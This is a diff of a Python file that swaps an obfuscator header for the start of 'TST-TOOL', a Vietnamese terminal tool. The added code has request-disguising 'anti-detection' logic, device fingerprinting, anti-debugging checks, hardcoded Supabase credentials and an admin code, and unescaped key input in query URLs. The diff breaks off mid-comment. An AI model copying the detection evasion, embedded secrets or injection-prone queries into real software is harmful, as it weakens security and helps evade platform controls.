@@ -1,56 +1,8458 @@
-import base64, zlib, hashlib
-_아송허 = "Nguyễn Xuân Trịnh & Phạm Anh Tiến"
-_남파후 = "PyHydra"
-_기포보 = "Hungrr81981 plan v1_free - import - Non Requests Protect"
-_투바타 = 0
-_람송구 = "Don't Read This Code Because You Will Be Dizzy By My Magic!"
-_도라카 = {
-    "en": "This obfuscator is made to protect people's code from being stolen, cracked. So there will be many bad elements using this obfuscator to obfuscate botnet files, keylogs, etc. So be careful when running this file!",
-    "vi": "Obfuscator này được làm ra để bảo vệ code của mọi người tránh bị đánh cắp, crack. Vì vậy sẽ có nhiều thành phần xấu sử dụng obfuscator này để obfuscate những file botnet, keylog, v.v. Vì vậy hãy cẩn thận khi run file này!",
-    "ko": "이 난독화 도구는 사람들의 코드를 도난과 크래킹으로부터 보호하기 위해 만들어졌습니다. 따라서 봇넷, 키로거 등의 파일을 난독화하기 위해 이 도구를 악용하는 나쁜 요소들이 많이 있을 것입니다. 이 파일을 실행할 때 주의하세요!",
+# -*- coding: utf-8 -*-
+from __future__ import annotations
+import subprocess
+import sys
+import importlib
+import os
+import threading
+import logging
+import json
+import time
+import random
+import math
+import re
+import hashlib
+import hmac
+import base64
+import socket
+import ipaddress
+import platform
+import uuid
+import secrets
+from collections import defaultdict, deque, Counter
+from datetime import datetime, timedelta, timezone
+from pathlib import Path
+from typing import Any, Dict, Tuple, Optional, List
+from urllib.parse import urlparse, parse_qs
+
+# ================== KIỂM TRA VÀ CÀI ĐẶT THƯ VIỆN ==================
+
+REQUIRED_PACKAGES = [
+    "pytz",
+    "requests",
+    "websocket-client",
+    "rich",
+    "cryptography",
+]
+
+def check_and_install_packages():
+    missing_packages = []
+    
+    print("=" * 60)
+    print("🔍 ĐANG KIỂM TRA THƯ VIỆN...")
+    print("=" * 60)
+    
+    for package in REQUIRED_PACKAGES:
+        try:
+            import_name = package
+            if package == "websocket-client":
+                import_name = "websocket"
+            elif package == "cryptography":
+                import_name = "cryptography"
+            
+            importlib.import_module(import_name)
+            print(f"✅ {package} - Đã cài đặt")
+        except ImportError:
+            missing_packages.append(package)
+            print(f"❌ {package} - CHƯA CÀI ĐẶT")
+    
+    if not missing_packages:
+        print("\n✅ TẤT CẢ THƯ VIỆN ĐÃ SẴN SÀNG!")
+        print("=" * 60)
+        return True
+    
+    print("\n" + "=" * 60)
+    print(f"⚠️  PHÁT HIỆN {len(missing_packages)} THƯ VIỆN THIẾU:")
+    for pkg in missing_packages:
+        print(f"   - {pkg}")
+    print("=" * 60)
+    print("\n🔄 ĐANG TIẾN HÀNH CÀI ĐẶT TỰ ĐỘNG...")
+    print("-" * 60)
+    
+    for package in missing_packages:
+        try:
+            print(f"📦 Đang cài đặt {package}...")
+            subprocess.check_call([
+                sys.executable, 
+                "-m", 
+                "pip", 
+                "install", 
+                package,
+                "--quiet"
+            ])
+            print(f"✅ Đã cài đặt {package} thành công!")
+        except Exception as e:
+            print(f"❌ Lỗi khi cài đặt {package}: {e}")
+            print(f"💡 Vui lòng cài đặt thủ công: pip install {package}")
+            return False
+    
+    print("\n" + "=" * 60)
+    print("✅ TẤT CẢ THƯ VIỆN ĐÃ ĐƯỢC CÀI ĐẶT XONG!")
+    print("=" * 60)
+    return True
+
+if not check_and_install_packages():
+    print("\n" + "=" * 60)
+    print("❌ KHÔNG THỂ CÀI ĐẶT ĐẦY ĐỦ THƯ VIỆN")
+    print("💡 VUI LÒNG CÀI ĐẶT THỦ CÔNG:")
+    print("   pip install pytz requests websocket-client rich cryptography")
+    print("=" * 60)
+    sys.exit(1)
+
+# ================== IMPORT THƯ VIỆN ==================
+
+import pytz
+import requests
+import websocket
+from rich.console import Console, Group
+from rich.table import Table
+from rich.panel import Panel
+from rich.live import Live
+from rich.align import Align
+from rich.prompt import Prompt, Confirm, IntPrompt, FloatPrompt
+from rich.rule import Rule
+from rich.text import Text
+from rich import box
+from rich.columns import Columns
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+# ================== CẤU HÌNH ==================
+
+console = Console(force_terminal=True, color_system="auto")
+tz = pytz.timezone("Asia/Ho_Chi_Minh")
+
+def force_clear():
+    """Xóa sạch hoàn toàn màn hình (hoạt động tốt trên Windows + Linux + macOS)"""
+    try:
+        # 1. System clear (Windows: cls, Linux/mac: clear)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+    except Exception:
+        pass
+
+    try:
+        # 2. Rich clear (gọi trực tiếp method gốc để tránh đệ quy)
+        Console.clear(console)
+    except Exception:
+        pass
+
+    try:
+        # 3. ANSI escape mạnh (xóa buffer + về đầu)
+        print("\033[2J\033[3J\033[H", end="", flush=True)
+    except Exception:
+        pass
+
+# Ghi đè console.clear() để mọi chỗ gọi đều xóa sạch
+console.clear = force_clear
+
+# ================== GIAO DIỆN TST-TOOL ==================
+
+TST_COLORS = {
+    # NOVA DARK // cinematic terminal — deep space + electric accents
+    "gold": "#FFD166",       # amber highlight
+    "gold_dark": "#C9920A",  # warm amber dim
+    "platinum": "#E2E8F0",   # near-white text on dark
+    "diamond": "#38BDF8",    # electric sky
+    "ruby": "#FF4D6D",       # hot coral-red
+    "emerald": "#06D6A0",    # neon mint-green
+    "sapphire": "#818CF8",   # periwinkle-indigo
+    "amethyst": "#A78BFA",   # soft violet
+    "onyx": "#1E293B",       # deep panel bg
+    "rose": "#FB7185",       # soft pink
+    "neon_blue": "#22D3EE",  # cyan electric
+    "neon_pink": "#F472B6",  # vivid rose
+    "neon_green": "#4ADE80", # lime signal
+    "neon_orange": "#FB923C",# warm signal
+    "crimson": "#EF4444",    # error red
+    "turquoise": "#2DD4BF",  # teal accent
+    "lavender": "#C4B5FD",   # muted violet
+    "sky": "#7DD3FC",        # soft sky blue
+    "mint": "#6EE7B7",       # pastel mint
+    "text": "#F1F5F9",       # primary text (light on dark)
+    "muted": "#94A3B8",      # secondary text
+    "surface": "#0F172A",    # deep background
+    "white": "#F8FAFC",      # near-white
+    "bg_panel": "#1E293B",   # panel dark
+    "bg_deep": "#0F172A",    # deepest bg
+    "accent_line": "#334155",# subtle dividers
 }
-_강러정 = "0b1d32480f86a95d80a963bca8f70c68b6c3ce0b1e9289a8f2e9adb2ed9294e7"
 
-def _투늘한(own, obf, usr, glb, cmt, doc):
-    doc_items = sorted(doc.items())
-    doc_str = "{" + ",".join(repr(k) + ":" + repr(v) for k, v in doc_items) + "}"
-    return "|".join([
-        "OWN=" + repr(own),
-        "OBF=" + repr(obf),
-        "USR=" + repr(usr),
-        "GLB=" + repr(glb),
-        "CMT=" + repr(cmt),
-        "DOC=" + doc_str,
+ICONS = {
+    "crown":"♛", "diamond":"◈", "star":"★", "fire":"⬡", "lightning":"⚡",
+    "target":"⊕", "shield":"⬡", "sword":"⟫", "brain":"◉", "robot":"▶",
+    "rocket":"▲", "trophy":"◆", "medal":"◎", "gem":"◈", "sparkle":"✦",
+    "settings":"◈", "user":"◉", "key":"⌘", "lock":"■", "unlock":"□",
+    "check":"✓", "cross":"✕", "warning":"▲", "info":"◆", "money":"◈",
+    "chart":"▦", "clock":"◷", "link":"→", "wifi":"≋", "globe":"⊕",
+    "plus":"＋", "minus":"−", "arrow":"▶", "heart":"♥", "bell":"◆",
+    "gift":"◈", "magic":"✦", "phone":"◉", "pulse":"◉", "scan":"⊡",
+    "ai":"▣", "race":"▶▶", "escape":"⊠", "lotto":"★",
+}
+
+# LOGO TST-TOOL — block chữ kiểu cũ (vàng / xanh xen kẽ)
+LOGO = r"""
+████████╗███████╗████████╗      ████████╗ ██████╗  ██████╗ ██╗     
+╚══██╔══╝██╔════╝╚══██╔══╝      ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+   ██║   ███████╗   ██║   █████╗   ██║   ██║   ██║██║   ██║██║     
+   ██║   ╚════██║   ██║   ╚════╝   ██║   ██║   ██║██║   ██║██║     
+   ██║   ███████║   ██║            ██║   ╚██████╔╝╚██████╔╝███████╗
+   ╚═╝   ╚══════╝   ╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+"""
+
+LOGO_TAGLINE = "TST-TOOL  ·  AI COMMAND SYSTEM  ·  V3"
+
+
+def print_tst_logo():
+    """In logo block chữ — căn đều, không lệch hàng."""
+    lines = [ln.rstrip() for ln in LOGO.splitlines() if ln.strip()]
+    # pad cùng width rồi center
+    width = max(len(ln) for ln in lines) if lines else 0
+    for i, line in enumerate(lines):
+        col = TST_COLORS["gold"] if i % 2 == 0 else TST_COLORS["sapphire"]
+        console.print(Align.center(Text(line.ljust(width), style=f"bold {col}")))
+    console.print(Align.center(Text(LOGO_TAGLINE, style=TST_COLORS["muted"])))
+
+
+
+def _ui_title(icon, title, subtitle=""):
+    """NOVA DARK: cinematic section header — icon + gradient wordmark."""
+    console.print()
+    # brand strip
+    brand = Text()
+    brand.append("  ♛ ", style=f"bold {TST_COLORS['gold']}")
+    brand.append("TST-TOOL", style=f"bold {TST_COLORS['platinum']}")
+    brand.append("  ·  ", style=TST_COLORS["accent_line"])
+    brand.append("NOVA", style=f"bold {TST_COLORS['sapphire']}")
+    brand.append("  ♛ ", style=f"bold {TST_COLORS['gold']}")
+    console.print(Align.center(brand))
+    console.print(Align.center(Text(
+        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰",
+        style=TST_COLORS["sapphire"]
+    )))
+    title_text = Text()
+    title_text.append(f" {icon}  ", style=f"bold {TST_COLORS['neon_orange']}")
+    title_text.append(title.upper(), style=f"bold {TST_COLORS['gold']}")
+    console.print(Align.center(title_text))
+    if subtitle:
+        console.print(Align.center(Text(f"  {subtitle}  ", style=TST_COLORS["muted"])))
+    console.print()
+
+
+def _ui_section(title, body, accent=None):
+    """NOVA DARK: sleek card with left accent bar."""
+    accent = accent or TST_COLORS["sapphire"]
+    head = Text()
+    head.append("▌ ", style=f"bold {accent}")
+    head.append(title.upper(), style=f"bold {TST_COLORS['gold']}")
+    console.print(head)
+    console.print(Panel(body, border_style=accent, box=box.HEAVY_HEAD, padding=(0, 2)))
+
+
+def _ui_prompt(label="COMMAND"):
+    return Prompt.ask(
+        f"\n[bold {TST_COLORS['gold']}] ♛  {label.upper()}[/bold {TST_COLORS['gold']}]"
+        f"[{TST_COLORS['accent_line']}] ─────────────────── [/{TST_COLORS['accent_line']}]"
+        f"[bold {TST_COLORS['emerald']}]▶[/bold {TST_COLORS['emerald']}]",
+        default="q"
+    ).strip()
+
+
+def _ui_chip(number, title, detail, accent):
+    t = Text()
+    t.append(f"  {number}  ", style=f"bold {TST_COLORS['bg_deep']} on {accent}")
+    t.append(f"  {title.upper()}  ", style=f"bold {TST_COLORS['gold']}")
+    t.append(detail, style=TST_COLORS["muted"])
+    return t
+
+
+def _ui_status_bar(pairs: list):
+    """Render a compact dark status strip from [(label, value, color)] list."""
+    t = Text()
+    for i, (label, value, color) in enumerate(pairs):
+        if i > 0:
+            t.append("  │  ", style=TST_COLORS["accent_line"])
+        t.append(f"{label} ", style=TST_COLORS["muted"])
+        t.append(value, style=f"bold {color}")
+    return Panel(
+        Align.center(t),
+        border_style=TST_COLORS["accent_line"],
+        box=box.SIMPLE,
+        padding=(0, 1),
+    )
+
+
+def _ui_divider(label=""):
+    """Sleek horizontal divider with optional centered label."""
+    if label:
+        console.print(Rule(f"[bold {TST_COLORS['muted']}] {label} [/]", style=TST_COLORS["accent_line"]))
+    else:
+        console.print(Rule(style=TST_COLORS["accent_line"]))
+
+# ================== BIẾN TOÀN CỤC ==================
+_ws_status = "⏳ Đang kết nối..."
+_is_authenticated = False
+_user_key = None
+_key_type = "free"
+_heartbeat_running = False
+_heartbeat_thread = None
+_in_menu = False
+_ip_info = {}
+AI_PERFORMANCE = defaultdict(lambda: {"wins": 0, "losses": 0, "total": 0})
+_secure_mode = False
+_secure_tool = None
+stop_flag = False
+USER_ID = None
+SECRET_KEY = None
+
+# ================== SUPABASE CONFIG ==================
+
+SUPABASE_URL = "https://ebviepssggyyrdeedpnz.supabase.co"
+SUPABASE_KEY = "sb_publishable_B3VF2kG0260fFrOtWBJi1g_ylklAm1_"
+ADMIN_SECRET_CODE = "9826665"
+
+# ================== TELEGRAM CONFIG ==================
+
+TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+TELEGRAM_CHAT_ID = ""
+TELEGRAM_ENABLED = False
+
+# ================== HỆ THỐNG BẢO MẬT (legacy) ==================
+
+class AntiDetectionSystem:
+    def __init__(self):
+        self.is_stealth_mode = False
+        self.detection_risk = 0
+        self.last_check = time.time()
+        self.request_history = []
+        self.stealth_session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+        ]
+        self.accept_languages = ['vi-VN,vi;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'vi;q=0.9,en;q=0.8']
+        self.last_request_time = 0
+        self.min_delay = 0.3
+        self.max_delay = 1.5
+    
+    def enable_stealth_mode(self):
+        self.is_stealth_mode = True
+        safe_console_print("[bold green]🛡️ Đã bật chế độ tàng hình![/bold green]")
+        self.stealth_session_id = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:8]
+    
+    def get_random_delay(self) -> float:
+        return random.uniform(self.min_delay, self.max_delay)
+    
+    def wait_before_request(self):
+        current_time = time.time()
+        elapsed = current_time - self.last_request_time
+        if elapsed < self.min_delay:
+            wait_time = self.get_random_delay() - elapsed
+            if wait_time > 0:
+                time.sleep(wait_time)
+        self.last_request_time = time.time()
+    
+    def get_random_headers(self) -> dict:
+        return {
+            'User-Agent': random.choice(self.user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': random.choice(self.accept_languages),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+        }
+    
+    def make_stealth_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
+        self.wait_before_request()
+        headers = self.get_random_headers()
+        if 'headers' in kwargs:
+            headers.update(kwargs['headers'])
+        kwargs['headers'] = headers
+        if 'timeout' not in kwargs:
+            kwargs['timeout'] = random.uniform(8, 15)
+        
+        try:
+            response = requests.request(method, url, **kwargs)
+            self.request_history.append({
+                'url': url,
+                'time': time.time(),
+                'status': response.status_code
+            })
+            self.check_detection_risk()
+            return response
+        except Exception as e:
+            safe_console_print(f"[yellow]⚠️ Request error: {e}[/yellow]")
+            return None
+    
+    def check_detection_risk(self):
+        recent_requests = [r for r in self.request_history 
+                          if time.time() - r['time'] < 60]
+        
+        if len(recent_requests) > 30:
+            self.detection_risk += 10
+        elif len(recent_requests) > 20:
+            self.detection_risk += 5
+        elif len(recent_requests) > 10:
+            self.detection_risk += 2
+        
+        if self.detection_risk > 70:
+            safe_console_print(f"[red]⚠️ Phát hiện rủi ro cao ({self.detection_risk}%)[/red]")
+            self.detection_risk = 0
+    
+    def get_status(self) -> dict:
+        return {
+            'stealth_mode': self.is_stealth_mode,
+            'detection_risk': self.detection_risk,
+            'request_count': len(self.request_history),
+            'session_id': self.stealth_session_id,
+        }
+    
+    def display_status(self):
+        status = self.get_status()
+        safe_console_print("\n" + "="*50)
+        safe_console_print("🛡️ ANTI-DETECTION STATUS")
+        safe_console_print("="*50)
+        safe_console_print(f"🔒 Stealth Mode: {'✅ BẬT' if status['stealth_mode'] else '❌ TẮT'}")
+        safe_console_print(f"⚠️ Detection Risk: {status['detection_risk']}%")
+        safe_console_print(f"📊 Total Requests: {status['request_count']}")
+        safe_console_print(f"🔑 Session ID: {status['session_id']}")
+        safe_console_print("="*50)
+
+class SecureTSTTool:
+    def __init__(self):
+        self.anti_detection = AntiDetectionSystem()
+        self.is_stealth = False
+    
+    def start_stealth_mode(self):
+        safe_console_print("\n[bold]🛡️ KHỞI ĐỘNG CHẾ ĐỘ CHỐNG SOI[/bold]")
+        safe_console_print("="*50)
+        self.anti_detection.enable_stealth_mode()
+        self.is_stealth = True
+        self.anti_detection.display_status()
+        safe_console_print("\n[green]✅ Đã sẵn sàng chống soi![/green]")
+        time.sleep(2)
+    
+    def make_secure_request(self, url: str, **kwargs) -> Optional[requests.Response]:
+        if self.is_stealth:
+            return self.anti_detection.make_stealth_request(url, **kwargs)
+        else:
+            method = kwargs.pop('method', 'GET')
+            return requests.request(method, url, **kwargs)
+    
+    def secure_post(self, url: str, **kwargs) -> Optional[requests.Response]:
+        if self.is_stealth:
+            return self.anti_detection.make_stealth_request(url, method='POST', **kwargs)
+        else:
+            return requests.post(url, **kwargs)
+    
+    def get_status(self) -> dict:
+        if self.is_stealth:
+            return self.anti_detection.get_status()
+        return {'stealth_mode': False}
+    
+    def display_status(self):
+        if self.is_stealth:
+            self.anti_detection.display_status()
+
+# ================== SCAN IP ==================
+
+def get_public_ip() -> Optional[str]:
+    try:
+        response = requests.get('https://api.ipify.org', timeout=5)
+        if response.status_code == 200:
+            return response.text.strip()
+    except:
+        pass
+    
+    try:
+        response = requests.get('https://ip-api.com/json', timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            return data.get('query')
+    except:
+        pass
+    return None
+
+def get_local_ip() -> Optional[str]:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return None
+
+def get_device_fingerprint() -> str:
+    """
+    Mã thiết bị CỐ ĐỊNH — chỉ từ phần cứng/OS.
+    Không ghi file .txt / .json (dễ sửa → đổi mã).
+    Không dùng time/random — cùng máy luôn ra cùng mã.
+    Ghim thật sự: lưu fingerprint lên Supabase lúc tạo user.
+    """
+    parts = []
+    # MAC (uuid.getnode) — ổn định trên cùng máy
+    try:
+        node = uuid.getnode()
+        mac = ":".join(f"{(node >> ele) & 0xFF:02x}" for ele in range(40, -1, -8))
+        parts.append(f"mac:{mac}")
+    except Exception:
+        pass
+    try:
+        parts.append(f"host:{socket.gethostname()}")
+    except Exception:
+        pass
+    try:
+        parts.append(f"sys:{platform.system()}")
+        parts.append(f"rel:{platform.release()}")
+        parts.append(f"mach:{platform.machine()}")
+        parts.append(f"proc:{platform.processor() or 'x'}")
+    except Exception:
+        pass
+    try:
+        # home path — ổn định theo user OS, không phải JSON app
+        parts.append(f"home:{Path.home()}")
+    except Exception:
+        pass
+
+    raw = "|".join(parts) if parts else "tst-tool-fixed-device"
+    # SHA256 đầy đủ rồi lấy 24 ký tự — cố định
+    return hashlib.sha256(raw.encode("utf-8", errors="ignore")).hexdigest()[:24]
+
+def scan_ip_ban_list() -> bool:
+    try:
+        ip = get_public_ip()
+        if not ip:
+            return False
+        
+        blacklist_file = "ip_blacklist.txt"
+        if not os.path.exists(blacklist_file):
+            with open(blacklist_file, 'w', encoding='utf-8') as f:
+                f.write("# Blacklisted IPs\n")
+            return False
+        
+        with open(blacklist_file, 'r', encoding='utf-8') as f:
+            blacklist = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        
+        if ip in blacklist:
+            safe_console_print(f"[red]❌ IP {ip} đã bị cấm![/red]")
+            return True
+        return False
+    except:
+        return False
+
+def check_ip_whitelist() -> bool:
+    try:
+        ip = get_public_ip()
+        if not ip:
+            return False
+        
+        whitelist_file = "ip_whitelist.txt"
+        if not os.path.exists(whitelist_file):
+            return True
+        
+        with open(whitelist_file, 'r', encoding='utf-8') as f:
+            whitelist = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        
+        if not whitelist:
+            return True
+        
+        if ip in whitelist:
+            return True
+        
+        for entry in whitelist:
+            if '/' in entry:
+                try:
+                    network = ipaddress.ip_network(entry, strict=False)
+                    if ipaddress.ip_address(ip) in network:
+                        return True
+                except:
+                    pass
+        
+        safe_console_print(f"[red]❌ IP {ip} không có trong whitelist![/red]")
+        return False
+    except:
+        return True
+
+class IPScanner:
+    def __init__(self):
+        self.public_ip = None
+        self.local_ip = None
+        self.device_fingerprint = None
+        self.location_info = None
+        self._scanned = False
+    
+    def scan(self) -> bool:
+        try:
+            self.public_ip = get_public_ip()
+            self.local_ip = get_local_ip()
+            self.device_fingerprint = get_device_fingerprint()
+            
+            if self.public_ip:
+                try:
+                    response = requests.get(f'http://ip-api.com/json/{self.public_ip}', timeout=5)
+                    if response.status_code == 200:
+                        self.location_info = response.json()
+                except:
+                    pass
+            
+            self._scanned = True
+            
+            if scan_ip_ban_list():
+                return False
+            
+            if not check_ip_whitelist():
+                return False
+            
+            self.log_scan_info()
+            return True
+        except Exception as e:
+            safe_console_print(f"[yellow]⚠️ Lỗi scan IP: {e}[/yellow]")
+            return False
+    
+    def log_scan_info(self):
+        log_data = {
+            "timestamp": datetime.now(tz).isoformat(),
+            "public_ip": self.public_ip,
+            "local_ip": self.local_ip,
+            "fingerprint": self.device_fingerprint,
+            "location": self.location_info,
+        }
+        
+        try:
+            with open("ip_scan_log.json", "a", encoding="utf-8") as f:
+                f.write(json.dumps(log_data, ensure_ascii=False) + "\n")
+        except:
+            pass
+        
+        safe_console_print("[dim]📡 SCAN IP:[/dim]")
+        if self.public_ip:
+            safe_console_print(f"  🌐 Public IP: [bold]{self.public_ip}[/bold]")
+        if self.local_ip:
+            safe_console_print(f"  🏠 Local IP: [bold]{self.local_ip}[/bold]")
+        if self.location_info:
+            city = self.location_info.get('city', 'N/A')
+            country = self.location_info.get('country', 'N/A')
+            safe_console_print(f"  📍 Location: [bold]{city}, {country}[/bold]")
+        safe_console_print(f"  🔑 Fingerprint: [dim]{self.device_fingerprint}[/dim]")
+        safe_console_print("")
+    
+    def get_status(self) -> dict:
+        return {
+            "scanned": self._scanned,
+            "public_ip": self.public_ip,
+            "local_ip": self.local_ip,
+            "fingerprint": self.device_fingerprint,
+            "location": self.location_info,
+        }
+    
+    def is_ip_safe(self) -> bool:
+        if not self._scanned:
+            self.scan()
+        if scan_ip_ban_list():
+            return False
+        if not check_ip_whitelist():
+            return False
+        return True
+
+def enhanced_auth_check():
+    global _ip_info
+    ip_scanner = IPScanner()
+    if not ip_scanner.scan():
+        safe_console_print("[red]❌ Scan IP thất bại! Tool sẽ không chạy.[/red]")
+        return False
+    if not ip_scanner.is_ip_safe():
+        safe_console_print("[red]❌ IP không an toàn! Tool sẽ không chạy.[/red]")
+        return False
+    _ip_info = ip_scanner.get_status()
+    return True
+
+# ================== CHỐNG DEBUG ==================
+
+def detect_debugger() -> bool:
+    try:
+        if sys.gettrace() is not None:
+            return True
+        if 'PYCHARM_HOSTED' in os.environ:
+            return True
+        return False
+    except:
+        return False
+
+def anti_crack_check() -> bool:
+    if detect_debugger():
+        console.print("[red]❌ Phát hiện debugger! Tool sẽ không chạy.[/red]")
+        return False
+    return True
+
+# ================== HÀM XÁC THỰC KEY ==================
+
+def verify_key_with_device(key: str) -> dict:
+    if detect_debugger():
+        return {"valid": False, "error": "Phát hiện debugger! Không thể xác thực."}
+
+    key = (key or "").strip()
+    url = f"{SUPABASE_URL}/rest/v1/keys?key_code=eq.{key}"
+
+    headers = supabase_headers()
+
+    try:
+        response = requests.get(url, headers=headers, timeout=15)
+
+        if response.status_code != 200:
+            # Fallback: key FREE local nếu Supabase lỗi
+            local_ok, local_uid, local_item = validate_local_free_key(key)
+            if local_ok and local_item:
+                exp = local_item.get("expires")
+                expires_at = datetime.fromtimestamp(float(exp), tz=timezone.utc).isoformat() if exp else "forever"
+                return {
+                    "valid": True,
+                    "data": {
+                        "key": key,
+                        "key_type": "free",
+                        "max_ai": 10,
+                        "expires_at": expires_at,
+                        "note": f"Local FREE key (user {local_uid})",
+                        "used_count": 0,
+                        "max_uses": None,
+                        "source": "local",
+                    }
+                }
+            return {"valid": False, "error": f"HTTP {response.status_code}"}
+
+        data = response.json()
+
+        if not data:
+            # Không có trên Supabase → thử key FREE local
+            local_ok, local_uid, local_item = validate_local_free_key(key)
+            if local_ok and local_item:
+                exp = local_item.get("expires")
+                expires_at = datetime.fromtimestamp(float(exp), tz=timezone.utc).isoformat() if exp else "forever"
+                return {
+                    "valid": True,
+                    "data": {
+                        "key": key,
+                        "key_type": "free",
+                        "max_ai": 10,
+                        "expires_at": expires_at,
+                        "note": f"Local FREE key (user {local_uid})",
+                        "used_count": 0,
+                        "max_uses": None,
+                        "source": "local",
+                    }
+                }
+            return {"valid": False, "error": "Key không tồn tại"}
+
+        keyData = data[0]
+
+        if keyData.get('status') != 'active':
+            return {"valid": False, "error": "Key đã bị vô hiệu hóa"}
+
+        if keyData.get('expires_at'):
+            try:
+                expiry = datetime.fromisoformat(keyData['expires_at'].replace('Z', '+00:00'))
+                if datetime.now().astimezone() > expiry:
+                    return {"valid": False, "error": "Key đã hết hạn"}
+            except Exception:
+                pass
+
+        used_count = keyData.get('used_count', 0)
+        max_uses = keyData.get('max_uses')
+        if max_uses and used_count >= max_uses:
+            return {"valid": False, "error": "Key đã đạt giới hạn sử dụng"}
+
+        new_count = used_count + 1
+        update_url = f"{SUPABASE_URL}/rest/v1/keys?key_code=eq.{key}"
+        update_data = {"used_count": new_count}
+
+        try:
+            requests.patch(update_url, json=update_data, headers=headers, timeout=10)
+        except Exception:
+            pass
+
+        return {
+            "valid": True,
+            "data": {
+                "key": key,
+                "key_type": keyData.get('key_type', 'free'),
+                "max_ai": keyData.get('max_ai', 10),
+                "expires_at": keyData.get('expires_at', 'forever'),
+                "note": keyData.get('note', ''),
+                "used_count": new_count,
+                "max_uses": keyData.get('max_uses'),
+                "source": "supabase",
+            }
+        }
+
+    except Exception as e:
+        local_ok, local_uid, local_item = validate_local_free_key(key)
+        if local_ok and local_item:
+            exp = local_item.get("expires")
+            expires_at = datetime.fromtimestamp(float(exp), tz=timezone.utc).isoformat() if exp else "forever"
+            return {
+                "valid": True,
+                "data": {
+                    "key": key,
+                    "key_type": "free",
+                    "max_ai": 10,
+                    "expires_at": expires_at,
+                    "note": f"Local FREE key (user {local_uid})",
+                    "used_count": 0,
+                    "max_uses": None,
+                    "source": "local",
+                }
+            }
+        return {"valid": False, "error": f"Lỗi: {str(e)}"}
+
+
+def supabase_headers(prefer: Optional[str] = None) -> dict:
+    """Headers chuẩn cho Supabase REST API."""
+    h = {
+        "apikey": SUPABASE_KEY,
+        "Authorization": f"Bearer {SUPABASE_KEY}",
+        "Content-Type": "application/json",
+        "User-Agent": "TST-TOOL-Secure/3.0",
+    }
+    if prefer:
+        h["Prefer"] = prefer
+    return h
+
+
+def create_key_on_supabase(
+    key_code: str,
+    key_type: str = "free",
+    max_ai: int = 10,
+    duration_hours: int = 13,
+    note: str = "",
+    user_id: str = "",
+    max_uses: Optional[int] = None,
+) -> tuple:
+    """
+    Tạo key mới trên Supabase (bảng keys).
+    Trả về (success: bool, message_or_data).
+    """
+    url = f"{SUPABASE_URL}/rest/v1/keys"
+    expires_at = (datetime.now(timezone.utc) + timedelta(hours=duration_hours)).isoformat()
+
+    payload = {
+        "key_code": key_code,
+        "key_type": key_type,
+        "status": "active",
+        "max_ai": max_ai,
+        "expires_at": expires_at,
+        "used_count": 0,
+        "note": note or f"Đổi xu - user {user_id}" if user_id else "KEY FREE 13H (đổi xu)",
+    }
+    if max_uses is not None:
+        payload["max_uses"] = max_uses
+
+    try:
+        response = requests.post(
+            url,
+            headers=supabase_headers(prefer="return=representation"),
+            json=payload,
+            timeout=15,
+        )
+
+        if response.status_code in (200, 201):
+            data = response.json()
+            row = data[0] if isinstance(data, list) and data else data
+            return True, {
+                "key_code": key_code,
+                "key_type": key_type,
+                "expires_at": expires_at,
+                "max_ai": max_ai,
+                "supabase": row,
+            }
+
+        # Conflict: key đã tồn tại
+        if response.status_code == 409:
+            return False, "Key đã tồn tại trên Supabase"
+
+        err_text = response.text[:300] if response.text else f"HTTP {response.status_code}"
+        return False, f"Supabase lỗi {response.status_code}: {err_text}"
+
+    except Exception as e:
+        return False, f"Lỗi kết nối Supabase: {str(e)}"
+
+
+# ================== SUPABASE USERS (NGUỒN CHÍNH — KHÔNG LƯU LOCAL) ==================
+# Toàn bộ user/xu/IP lưu trên Supabase. Không dùng user_data.enc.
+# SQL tạo bảng (SQL Editor):
+#   create table if not exists public.users (
+#     user_id text primary key,
+#     ip text,
+#     coins double precision default 0,
+#     total_mined double precision default 0,
+#     keys_count int default 0,
+#     keys jsonb default '[]'::jsonb,
+#     daily_claim_date text default '',
+#     coin_day text default '',
+#     mining boolean default false,
+#     mining_start double precision default 0,
+#     note text default '',
+#     fingerprint text default '',
+#     status text default 'active',
+#     created_at timestamptz default now(),
